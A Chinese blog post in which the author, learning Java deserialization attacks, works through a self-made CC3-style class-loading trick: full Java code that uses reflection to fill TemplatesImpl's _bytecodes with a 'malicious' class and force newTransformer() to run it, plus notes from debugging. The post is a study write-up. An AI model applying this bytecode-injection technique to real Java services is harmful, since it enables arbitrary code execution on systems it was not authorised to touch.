---
title: "一个搞笑的铸币CC3"
onlyTitle: true
date: 2024-8-1 11:21:21
categories:
- java
- CC
tags:
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B892.jpg

---



今天没事想自己写个CC3类加载

结果为了顺利触发到TemplatesImpl#getTransletInstance的newInstance给我整急眼了，使劲改字段强行通过循环
![](https://i-blog.csdnimg.cn/direct/52b9cf112fac47398f1dd43765926eb7.png)

刚才判定了，_auxClasses为transient，不能用这种方法

结果搞了个下面的代码出来

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Properties;

public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "CC6TiedMapEntry");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            } else if (field.getName().equals("_outputProperties")) {
                field.set(templatesClass, new Properties());
            } else if (field.getName().equals("_transletIndex")) {
                field.set(templatesClass, 0);
            } else if (field.getName().equals("_auxClasses")) {
                field.set(templatesClass, new HashMap<>());
            }
        }
        templatesClass.newTransformer();
    }
}
```
你别说，还真TM能跑。![](https://i-blog.csdnimg.cn/direct/bd39e593812d4fe8b63b3e1c14d9cc5b.png)说一下怎么搞的
调试的时候bytecode数组只有一个恶意类，就创建不了hashMap，后面就put不进去。
![](https://i-blog.csdnimg.cn/direct/00d7d3bddf1c48db8327039c4c27ac6c.png)于是我bytecode传了两个恶意数组
```java
	field.set(templatesClass, new byte[][]{code,code});
```
结果进第二个catch，hashMap不能重复put
![](https://i-blog.csdnimg.cn/direct/6c6442df540e46b79bcce2e74b388a0d.png)我又传了个空字节，我去，空字节不能defineClass，连循环都出不了
```java
	field.set(templatesClass, new byte[][]{code,new byte[0]});
```
突然想到，我自己搞个hashMap就完了，用他的干毛啊
于是
```java
else if (field.getName().equals("_auxClasses")) {
                field.set(templatesClass, new HashMap<>());
            }
```
感觉像个大铸币写的